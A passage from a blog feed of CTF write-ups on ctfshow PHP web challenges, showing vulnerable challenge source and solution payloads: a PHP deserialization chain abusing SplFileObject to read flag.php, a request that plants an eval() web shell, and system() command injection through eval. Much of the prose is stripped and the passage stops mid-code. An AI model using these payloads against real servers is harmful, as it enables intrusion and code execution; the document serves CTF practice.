keyword">public</span> <span class="token variable">$leader</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$leader</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">leader</span> <span class="token operator">=</span> <span class="token variable">$leader</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">hahaha</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'one class'</span> <span class="token keyword">or</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">leader</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'ing'</span> <span class="token keyword">or</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">leader</span><span class="token operator">-></span><span class="token property">rank</span> <span class="token operator">!=</span><span class="token string single-quoted-string">'department'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">school</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$department</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$headmaster</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$department</span><span class="token punctuation">,</span><span class="token variable">$ceo</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">department</span> <span class="token operator">=</span> <span class="token variable">$department</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">headmaster</span> <span class="token operator">=</span> <span class="token variable">$ceo</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">IPO</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">headmaster</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'ong'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Pretty Good ! Ctfer!\n"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">department</span><span class="token operator">-></span><span class="token function">hahaha</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">IPO</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'d'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'d'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">classroom</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$leader</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$leader</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">leader</span> <span class="token operator">=</span> <span class="token variable">$leader</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">hahaha</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'one class'</span> <span class="token keyword">or</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">leader</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'ing'</span> <span class="token keyword">or</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">leader</span><span class="token operator">-></span><span class="token property">rank</span> <span class="token operator">!=</span><span class="token string single-quoted-string">'department'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>name=&quot;one class&quot;,leader=&quot;ing&quot;,rank=&quot;department&quot;</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">school</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$department</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$headmaster</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$department</span><span class="token punctuation">,</span><span class="token variable">$ceo</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">department</span> <span class="token operator">=</span> <span class="token variable">$department</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">headmaster</span> <span class="token operator">=</span> <span class="token variable">$ceo</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">IPO</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">headmaster</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'ong'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Pretty Good ! Ctfer!\n"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>headmaster=&quot;ong&quot;</code><strong>ab</strong>php<strong>SplFileObject</strong>bflag.php<br></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// flag.php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">teacher</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$rank</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span><span class="token string single-quoted-string">'ing'</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">rank</span> <span class="token operator">=</span><span class="token string single-quoted-string">'department'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">classroom</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$leader</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span><span class="token string single-quoted-string">'one class'</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">leader</span> <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">teacher</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">school</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$department</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$headmaster</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">department</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">classroom</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">headmaster</span> <span class="token operator">=</span><span class="token string single-quoted-string">'ong'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">school</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag<br><img src="https://img-blog.csdnimg.cn/5ffb75187dbc42149eb9443b38b8d876.png" alt="2"></p>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP</title>
      <link href="/2023/04/07/PHP%E7%89%B9%E6%80%A7/"/>
      <url>/2023/04/07/PHP%E7%89%B9%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">==</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[a-z]|\./i"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//a-z.</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//0</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no no no!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>phpintval00x<br>0,0x447610574php+<br>?num&#x3D;+010574</p><h2 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php">Notice: Undefined index: flag in /var/www/html/index.php on line 15Notice: Undefined index: flag in /var/www/html/index.php on line 16Notice: Undefined index: HTTP_FLAG in /var/www/html/index.php on line 17<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-18 21:39:27# @link: https://ctfer.com*/</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_GET</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_POST</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span><span class="token comment">//getgetpost</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag'</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_COOKIE</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span><span class="token comment">//get(flag)flagcookieflag</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag'</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_SERVER</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">;</span><span class="token comment">//get(flag)flagSERVERflag</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_FLAG'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'flag'</span><span class="token operator">?</span><span class="token variable">$flag</span><span class="token punctuation">:</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//get(HTTP_FLAG)flagflag.php</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ok,get<code>?1=3</code>post<code>HTTP_FLAG=flag</code>flag<br><img src="https://img-blog.csdnimg.cn/162ebf1159144b3c94f25788a35441d6.png" alt="1"></p><h2 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-18 22:36:12# @link: https://ctfer.com*/</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$allow</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">36</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x36d</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">//0x36d=877</span>    <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$allow</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//$allow</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$allow</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//n$allowtrue</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//postcontent</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload<code>?n=1.php</code>in_array1.php1<br>post<code>content=&lt;? eval($_POST[a]);?&gt;</code></p><h1 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ctfshow.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//flag in class ctfshow;</span><span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfshow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$v1</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v2</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v3</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v0</span><span class="token operator">=</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;/"</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;/"</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v2</span></span>('ctfshow')<span class="token interpolation"><span class="token variable">$v3</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong></strong><br><img src="https://img-blog.csdnimg.cn/61e22c6d589646a29eedcc378991996f.png" alt="2"><br><strong></strong><br>payload<code>?v1=1&amp;v2=system(&quot;ls&quot;)/*&amp;v3=;*/;</code><br><code>?v1=1&amp;v2=system(&quot;cat ctfshow*&quot;)/*&amp;v3=;*/;</code><br><strong></strong><br><strong>phpReflectionClass</strong><br><code>?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</code><br><img src="https://img-blog.csdnimg.cn/61af74a693254f7aa8822b5d01eb4015.png" alt="1"><br>0x2d<code>-</code>ctfshow{}</p><h2 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v4</span> <span class="token operator">=</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>call_user_func</code><br>call_user_func</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">add</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token variable">$a</span> <span class="token operator">+</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'add'</span><span class="token punctuation">,</span> <span 